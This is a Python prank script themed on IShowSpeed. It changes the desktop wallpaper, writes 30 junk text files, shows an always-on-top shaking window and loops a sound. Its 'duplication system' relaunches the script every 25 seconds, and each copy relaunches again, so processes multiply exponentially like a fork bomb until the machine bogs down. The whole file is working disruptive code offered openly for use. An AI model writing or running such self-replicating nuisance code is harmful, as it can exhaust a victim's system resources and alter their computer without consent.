import tkinter as tk
from PIL import Image, ImageTk
import os
import random
import subprocess
import sys

# 1. THE WALLPAPER HACK (Linux/Chromebook)
def change_wallpaper():
    try:
        path = os.path.abspath("speed.png")
        # Command for ChromeOS/Linux desktop wallpaper change
        os.system(f"gsettings set org.gnome.desktop.background picture-uri 'file://{path}'")
        os.system(f"gsettings set org.gnome.desktop.background picture-uri-dark 'file://{path}'")
    except:
        pass

# 2. CREATE THE SECRET "CRASHOUT" FILES
folder = "Ishow speed secret files"
if not os.path.exists(folder):
    os.makedirs(folder)
    
crashouts = ["BARK BARK BARK", "SEWEYYY!", "I SHOW SPEED GOAT", "SPEED CRASHOUT!", "SPEED IS WATCHING"]

for i in range(30):
    with open(f"{folder}/chaos_{i}.txt", "w") as f:
        lines = random.sample(crashouts * 2, 7)
        f.write("\n".join(lines))

# 3. THE SHAKING BOUNCING WINDOW
root = tk.Tk()
root.attributes("-topmost", True)
root.overrideredirect(True)
root.config(bg='black')

img = Image.open("speed.png").resize((250, 250))
photo = ImageTk.PhotoImage(img)

tk.Label(root, text="BARK BARK BARK SPEEDY FILES R MY", fg="white", bg="red", font=("Arial", 12, "bold")).pack()
label = tk.Label(root, image=photo, bg='black').pack()

x, y = random.randint(0, 500), random.randint(0, 500)
dx, dy = 8, 8
screen_w = root.winfo_screenwidth()
screen_h = root.winfo_screenheight()

def bounce_and_shake():
    global x, y, dx, dy
    x += dx
    y += dy
    shake_x, shake_y = x + random.randint(-15, 15), y + random.randint(-15, 15)
    if x <= 0 or x >= screen_w - 250: dx = -dx
    if y <= 0 or y >= screen_h - 300: dy = -dy
    root.geometry(f"+{int(shake_x)}+{int(shake_y)}")
    root.after(10, bounce_and_shake)

# 4. THE DUPLICATION SYSTEM (Every 25 seconds)
def duplicate():
    subprocess.Popen([sys.executable] + sys.argv)
    root.after(25000, duplicate)

# 5. LOOPING BARK
def loop_sound():
    subprocess.Popen(["mpg123", "-q", "speed_sound.mp3"])
    root.after(5000, loop_sound) # Loops every 5 seconds

change_wallpaper()
loop_sound()
duplicate()
bounce_and_shake()
root.mainloop()
